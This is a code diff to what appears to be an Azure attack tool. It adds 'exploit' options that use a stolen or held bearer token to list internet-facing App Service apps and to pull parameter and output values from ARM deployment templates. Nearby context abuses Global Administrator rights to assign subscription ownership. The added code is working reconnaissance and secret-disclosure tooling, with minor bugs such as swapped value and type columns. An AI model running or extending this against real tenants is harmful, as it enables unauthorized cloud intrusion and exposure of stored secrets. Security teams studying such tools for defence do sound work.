@@ -120,7 +120,6 @@ This API help to abuse Global Administrator with privileges to Azure Resources t
 '''
 def GA_AssignSubscriptionOwnerRole(subscriptionId):
     global Token
-    print(parseUPN())
     headers = {
         'Content-Type': 'application/json',
         'Authorization': 'Bearer ' + Token
@@ -152,6 +151,65 @@ def RD_AddAppSecret():
         headers=headers)
     result = r.json()
     return result
+
+def getResGroup(subid):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.get("https://management.azure.com/subscriptions/"+subid+"/resourcegroups?api-version=2021-04-01",headers=headers)
+    return r.json()
+
+
+def getArmTempPerResGroup(subid,resgroup):
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    r = requests.get("https://management.azure.com/subscriptions/"+subid+"/resourcegroups/"+resgroup+"/providers/Microsoft.Resources/deployments/?api-version=2021-04-01",headers=headers)
+    return r.json()
+
+def RD_ListExposedWebApps():
+    global Token
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
+    for sub in rs.json()['value']:
+        r = requests.get(
+            "https://management.azure.com/subscriptions/"+sub['subscriptionId']+"/providers/Microsoft.Web/sites?api-version=2022-03-01",
+            headers=headers)
+        return r.json()
+    return False
+
+def RD_ListARMTemplates():
+    global Token
+
+    finalResult = []
+    headers = {
+        'Content-Type': 'application/json',
+        'Authorization': 'Bearer ' + Token
+    }
+
+    rs = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
+    for sub in rs.json()['value']:
+        for res in getResGroup(sub['subscriptionId'])['value']:
+            for template in getArmTempPerResGroup(sub['subscriptionId'], res['name'])['value']:
+                currenttemplate = template
+                currentdata = {'name': currenttemplate['name'], 'id': currenttemplate['id']}
+                if 'parameters' in currenttemplate['properties']:
+                    currentdata['params'] = currenttemplate['properties']['parameters']
+                else:
+                    continue
+                if 'outputs' in currenttemplate['properties']:
+                    currentdata['outputs'] = currenttemplate['properties']['outputs']
+                else:
+                    continue
+                finalResult.append(currentdata)
+    return finalResult
 def CHK_AppRegOwner(appId):
     global accessTokenGraph
     headers = {
@@ -550,6 +608,34 @@ def attackWindow():
             else:
                 exit
                 statupWindow(True)
+        elif "Reader/ExposedAppServiceApps" in ExploitChoosen and mode == "run":
+            print("Trying to enumerate all external-facing Azure Service Apps..")
+            AppServiceRecords = PrettyTable()
+            AppServiceRecords.align = "l"
+            AppServiceRecords.field_names = ["#", "App Name", "Type", "Status", "Enabled Hostname(s)"]
+            AppServiceRecordsCount = 0
+            for AppServiceRecord in RD_ListExposedWebApps()['value']:
+                AppServiceRecords.add_row([AppServiceRecordsCount, AppServiceRecord['name'], AppServiceRecord['kind'], AppServiceRecord['properties']['state'], ",".join(AppServiceRecord['properties']['enabledHostNames'])])
+                AppServiceRecordsCount += 1
+            print(AppServiceRecords)
+        elif "Reader/ARMTemplatesDisclosure" in ExploitChoosen and mode == "run":
+            print("Trying to enumerate outputs and parameters strings from a Azure Resource Manager (ARM)..")
+            ArmTempRecords = PrettyTable()
+            ArmTempRecords.align = "l"
+            ArmTempRecords.field_names = ["#", "Deployment Name", "Parameter Name", "Parameter Value", "Type"]
+            ArmTempRecordsCount = 0
+            print("Skipping SecureString/Object/Array values from list..")
+            for ArmTempRecord in RD_ListARMTemplates():
+                for itStr in ArmTempRecord['params']:
+                    if ArmTempRecord['params'][itStr]['type'] == "SecureString" or ArmTempRecord['params'][itStr]['type'] == "Array" or ArmTempRecord['params'][itStr]['type'] == "Object":
+                        continue
+                    ArmTempRecords.add_row(
+                        [ArmTempRecordsCount, ArmTempRecord['name'], itStr, ArmTempRecord['params'][itStr]['type'],
+                         ArmTempRecord['params'][itStr]['value']])
+                for itStrO in ArmTempRecord['outputs']:
+                    ArmTempRecords.add_row([ArmTempRecordsCount, ArmTempRecord['name'], itStrO, ArmTempRecord['outputs'][itStrO]['type'],ArmTempRecord['outputs'][itStrO]['value']])
+                ArmTempRecordsCount += 1
+            print(ArmTempRecords)
         elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
             print("Trying to enumerate all service principles (App registrations)..")
             EntAppsRecords = PrettyTable()
